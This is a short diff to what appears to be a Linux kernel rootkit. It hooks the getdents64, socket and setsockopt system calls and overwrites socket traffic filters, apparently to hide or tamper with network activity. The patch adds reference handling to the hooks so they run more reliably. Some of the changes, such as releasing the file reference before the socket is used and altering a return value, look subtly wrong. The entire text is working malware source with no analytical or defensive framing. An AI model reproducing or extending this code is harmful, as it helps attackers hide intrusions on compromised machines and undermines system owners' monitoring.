@@ -129,6 +129,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 
 static asmlinkage long hook_socket(const struct pt_regs *regs)
 {
+    struct file *file;
     struct socket *sock;
     int family = regs->di;
     int fd = orig_socket(regs);
@@ -137,13 +138,19 @@ static asmlinkage long hook_socket(const struct pt_regs *regs)
         return fd;
     }
 
-    sock = sock_from_file(fget(fd));
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
+        return fd;   
+    }
+    sock = sock_from_file(file);
+    fput(file);
     if (sock == NULL) {
         ROOTI_DEBUG("sock_from_file() failed");
         return fd;
     }
-    rooti_overwrite_traffic_filter(sock->sk);
 
+    rooti_overwrite_traffic_filter(sock->sk);
     return fd;
 }
 
@@ -154,6 +161,7 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
     int optlen = regs->r8;
     sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);
 
+    struct file *file;
     struct socket *sock;
     struct sock_fprog user_fprog;
 
@@ -162,10 +170,16 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
         return err;
     }
 
-    sock = sock_from_file(fget(fd));
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
+        return fd;   
+    }
+    sock = sock_from_file(file);
+    fput(file);
     if (sock == NULL) {
         ROOTI_DEBUG("sock_from_file() failed");
-        return 0;
+        return fd;
     }
 
     switch (optname) {
